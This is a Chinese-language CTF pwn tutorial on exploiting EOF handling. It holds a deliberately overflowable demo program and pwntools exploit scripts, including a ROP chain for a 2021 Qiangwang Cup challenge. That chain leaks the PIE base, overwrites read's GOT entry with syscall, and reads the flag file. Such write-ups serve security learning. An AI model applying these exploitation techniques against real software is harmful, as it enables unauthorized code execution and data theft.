@@ -1,0 +1,185 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="5f6012753b3188c6d394b4759989a394">EOF利用</h1>
+<h2 data-content="1" id="ee6bd203d69bca702a435e44b55f42a5">背景知识</h2>
+<p>EOF 代表 End of File，是一个在计算机科学中常见的术语，用于指示文件的结束。EOF 信号是在文件或输入流中的数据结束时发出的信号。当程序读取文件或输入流时，它会在遇到文件的末尾时收到 EOF 信号，从而知道已经到达了文件的结束。<br/>
+EOF信号的具体表示方式，可以根据不同的操作系统和编程语言而有所不同。</p>
+<p>pwn 中的 EOF 有两种<br/>
+一种是 EOF 之后，还可以接着输入数据，但是只能本地用，无法远程。<br/>
+一种是直接关闭输入流，那么发送 EOF 之后，之后就无法向程序输入数据。</p>
+<h2 data-content="1" id="95fb318599144951c2085acd1d3eb4dc">eof 发送后继续输入</h2>
+<h3 data-content="1" id="4748773db307bcce862a82bae9512bbe">demo</h3>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> 
+<span class="p">{</span>
+   <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+   <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 
+    <span class="p">{</span>
+      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> 
+      <span class="p">{</span>
+         <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>read返回值：<br/>
+返回值为读取的字节数，如果到达文件末尾 (EOF)，则返回 0。<br/>
+如果出现错误，返回 -1，并设置 errno 变量以指示错误的类型<br/>
+这里我们输入正常的数据并不会跳出循环，而是会一直判断</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115253-8acc7d28-c17e-1.png"/><br/>
+这里我们利用 stdin=PTY 指定标准输入连接到一个伪终端。<br/>
+这可以在模拟终端输入的环境中执行程序。<br/>
+然后我们输入EOF信号后</p>
+<div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">,</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">,</span><span class="n">raw</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">tty</span><span class="o">.</span><span class="n">CEOF</span><span class="p">))</span>
+</pre></div>
+<p>这里 raw=False 是输入和输出不进行任何处理，字节直接传递</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115313-970ab000-c17e-1.png"/><br/>
+可以发现确实跳出了循环</p>
+<h3 data-content="1" id="86750fee806e47e36bbe8c7cb84efe00">exp</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">tty</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+
+<span class="c1">#context(os = 'linux',log_level = "debug",arch = 'amd64')</span>
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
+<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>
+
+<span class="n">x64_32</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="k">if</span> <span class="n">x64_32</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'i386'</span>
+
+<span class="k">def</span> <span class="nf">duan</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">,</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">,</span><span class="n">raw</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">tty</span><span class="o">.</span><span class="n">CEOF</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="0704a2e4ba123f260ed8a16ee8c66eb0">eof 发送后结束输入</h2>
+<p>利用一个例题了来分析这种利用方法<br/>
+[广东强网杯 2021 个人决赛]server</p>
+<h3 data-content="1" id="dbc67552e769f51a50649872457dc94c">思路</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115347-ab27b6aa-c17e-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115353-ae7544a8-c17e-1.png"/><br/>
+这里就是可以泄露出password的地址，但是因为后面read的返回值大于0，所以就一直循环<br/>
+也可以让read返回0，但是之后程序便无法运行，所以只能提前布置好rop</p>
+<div class="highlight"><pre><span></span><span class="n">ru</span><span class="p">(</span><span class="s1">'Username: '</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="s1">'r00t'</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">'Password: '</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="s1">'k'</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">'[*] Gift: '</span><span class="p">)</span>
+<span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x4090</span>
+<span class="n">leak</span><span class="p">(</span><span class="s1">'pie_base '</span><span class="p">,</span><span class="n">pie_base</span><span class="p">)</span>
+</pre></div>
+<p>首先先去泄露pie，然后利用下面这个magicgadget去修改read的got表变成syscall</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115416-bc71a344-c17e-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115422-c001bb66-c17e-1.png"/><br/>
+这里就是利用了read的got表去写syscall</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240202115430-c496b820-c17e-1.png"/><br/>
+然后最后执行就可以，不过貌似出了点小问题，没法打印flag，不过也是学到了这个知识点和一个magicgadget的应用</p>
+<h3 data-content="1" id="4772283f0e773434f537754f7a304092">exp</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+
+<span class="c1">#context(os = 'linux',log_level = "debug",arch = 'amd64')</span>
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
+<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>
+
+<span class="n">x64_32</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="k">if</span> <span class="n">x64_32</span><span class="p">:</span>
+        <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'i386'</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="c1">#p=remote('node4.anna.nssctf.cn',28819)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">duan</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Username: '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'r00t'</span><span class="p">)</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Password: '</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'flag'</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">'[*] Gift: '</span><span class="p">)</span>
+<span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x4090</span>
+<span class="n">leak</span><span class="p">(</span><span class="s1">'pie_base '</span><span class="p">,</span><span class="n">pie_base</span><span class="p">)</span>
+<span class="c1">#duan()</span>
+
+<span class="n">rdi</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x1613</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x101a</span>
+<span class="n">rax</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x1239</span>
+<span class="n">rdx</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x123b</span>
+<span class="n">rsi_r15</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x1611</span>
+<span class="n">magic</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x1232</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4090</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x40A0</span>
+
+<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x500</span><span class="p">))</span>
+<span class="c1"># read@got -&gt; syscall</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4040</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span>
+<span class="c1"># open</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4040</span><span class="p">)</span>
+<span class="c1"># raed</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4040</span><span class="p">)</span>
+<span class="c1"># write</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x4040</span><span class="p">)</span>
+<span class="c1">#sleep(0.2)</span>
+<span class="c1">#duan()</span>
+<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'[IN] '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">'send'</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+
+<span class="n">itr</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
